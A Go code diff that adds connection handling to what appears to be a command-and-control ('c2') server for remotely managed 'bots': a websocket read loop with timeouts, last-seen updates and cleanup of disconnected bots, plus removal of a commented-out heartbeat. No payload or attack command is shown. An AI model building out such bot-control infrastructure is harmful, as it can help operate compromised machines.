@@ -7,6 +7,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"strconv"
 	"sync"
 	"time"
 
@@ -99,37 +100,38 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 }
 
 func (c *c2) listentoBot(bot *Bot) {
+	defer func() {
+		bot.mu.Lock()
+		bot.Active = false
 
+		if bot.con != nil {
+			bot.con.Close(websocket.StatusNormalClosure, "Closing the connection for the bot: "+strconv.Itoa(bot.ID)+bot.OS)
+		}
+		bot.mu.Unlock()
+
+		c.mu.Lock()
+		delete(c.bots, bot.ID)
+		c.mu.Unlock()
+
+		log.Println("Deleted the Bot: ", bot.ID, "From the global bot list")
+
+	}()
+
+	var msg BotMessage
+	for {
+		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Minute)
+		err := wsjson.Read(ctx, bot.con, &msg)
+		cancel()
+
+		if err != nil {
+			log.Println("Bot Disconnected/Timeout : ", err)
+			return
+		}
+
+		bot.updateLastseen()
+
+	}
 }
-
-// func heartBeat(con *websocket.Conn, bot *Bot) {
-
-// 	timer := time.Tick(10 * time.Second)
-// 	inactiveSince := time.Now()
-
-// 	for range timer {
-// 		bot.mu.Lock()
-// 		lastseen := bot.LastSeen
-// 		active := bot.Active
-// 		bot.mu.Unlock()
-// 		if !active {
-// 			if time.Since(inactiveSince) > 15*time.Second {
-// 				fmt.Println("Closing now...")
-// 				con.CloseNow()
-// 				return
-// 			}
-// 			continue
-// 		}
-
-// 		if time.Since(lastseen) > 1*time.Minute {
-// 			fmt.Println("Closing now..")
-// 			con.CloseNow()
-// 			return
-// 		}
-
-// 	}
-
-// }
 
 func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 	cmd := Command{}
